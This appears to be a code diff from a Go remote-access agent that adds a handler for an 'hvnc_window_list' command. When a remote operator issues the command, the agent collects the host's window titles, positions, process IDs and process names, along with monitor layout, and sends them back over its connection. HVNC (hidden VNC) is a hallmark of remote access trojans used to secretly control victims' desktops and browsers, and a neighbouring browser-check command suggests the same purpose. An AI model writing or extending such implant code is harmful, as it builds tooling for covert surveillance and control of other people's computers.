@@ -1554,6 +1554,45 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		})
 		return nil
 
+	case "hvnc_window_list":
+		log.Printf("hvnc: window list requested")
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_window_list", nil, func() {
+			windows, monitors := capture.HVNCEnumWindows()
+			winEntries := make([]wire.HVNCWindowEntry, 0, len(windows))
+			for _, w := range windows {
+				winEntries = append(winEntries, wire.HVNCWindowEntry{
+					Title:       w.Title,
+					X:           w.X,
+					Y:           w.Y,
+					Width:       w.Width,
+					Height:      w.Height,
+					PID:         w.PID,
+					ProcessName: w.ProcessName,
+					Monitor:     w.Monitor,
+				})
+			}
+			monEntries := make([]wire.HVNCMonitorEntry, 0, len(monitors))
+			for _, m := range monitors {
+				monEntries = append(monEntries, wire.HVNCMonitorEntry{
+					Index:   m.Index,
+					Name:    m.Name,
+					X:       m.X,
+					Y:       m.Y,
+					Width:   m.Width,
+					Height:  m.Height,
+					Primary: m.Primary,
+				})
+			}
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCWindowListResult{
+				Type:     "hvnc_window_list_result",
+				Windows:  winEntries,
+				Monitors: monEntries,
+			})
+			log.Printf("hvnc: window list sent: %d windows, %d monitors", len(winEntries), len(monEntries))
+		})
+		return nil
+
 	case "hvnc_browser_check":
 		log.Printf("hvnc: browser availability check requested")
 		sendCommandResultSafe(env, cmdID, true, "")
